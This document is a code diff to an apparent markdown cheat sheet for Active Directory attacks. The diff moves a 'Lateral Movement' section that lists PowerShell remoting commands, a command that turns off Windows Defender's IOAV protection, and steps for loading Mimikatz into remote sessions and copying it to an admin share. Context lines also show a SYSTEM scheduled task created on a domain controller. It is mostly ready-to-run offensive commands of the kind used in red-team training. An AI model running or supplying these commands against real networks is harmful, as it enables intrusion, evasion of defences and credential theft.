@@ -153,6 +153,31 @@ Invoke-AllChecks
 
 ```Get-ModifiableServiceFile | select servicename, abusefeature```
 
+# Lateral Movement
+#### PowerShell Remoting
+```Find-LocalAdminAccess -CheckAccess```
+
+```Enter-PSSession –Computername Server1```
+
+```$Sess = New-PSSession –Computername Server1```
+
+```Invoke-Command –Session $Sess –ScriptBlock {whoami;host name;ipconfig}```
+
+```Invoke-Command –Session $Sess –ScriptBlock {$Proc = Get- Process}```
+
+```Invoke-Command –Session $Sess –ScriptBlock {$Proc.name}```
+
+```Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess ```
+
+If functions not on remote host:-
+
+```. ./Invoke-Mimikatz.ps1```
+```Invoke-Command –Session $Sess -ScriptBlock ${function:Invoke-Mimikatz}```
+
+##### Copy Across
+```Copy-Item ./Invoke-Mimikatz.ps1 /Server1.local/c$/temp```
+``` ls //Server1.local/c$/temp```
+
 # Tickets
 
 NTLM == RC4
@@ -197,30 +222,7 @@ schtasks /create /S dc01.ecorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "U
 ```
 schtasks /Run /S dc01.ecorp.moneycorp.local /TN "Updater123"
 ```
-# Lateral Movement
-#### PowerShell Remoting
-```Find-LocalAdminAccess -CheckAccess```
 
-```Enter-PSSession –Computername Server1```
-
-```$Sess = New-PSSession –Computername Server1```
-
-```Invoke-Command –Session $Sess –ScriptBlock {whoami;host name;ipconfig}```
-
-```Invoke-Command –Session $Sess –ScriptBlock {$Proc = Get- Process}```
-
-```Invoke-Command –Session $Sess –ScriptBlock {$Proc.name}```
-
-```Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess ```
-
-If functions not on remote host:-
-
-```. ./Invoke-Mimikatz.ps1```
-```Invoke-Command –Session $Sess -ScriptBlock ${function:Invoke-Mimikatz}```
-
-##### Copy Across
-```Copy-Item ./Invoke-Mimikatz.ps1 /Server1.local/c$/temp```
-``` ls //Server1.local/c$/temp```
 
 # Invoke Mimikatz
 ```. ./Invoke-Mimikatz.ps1```
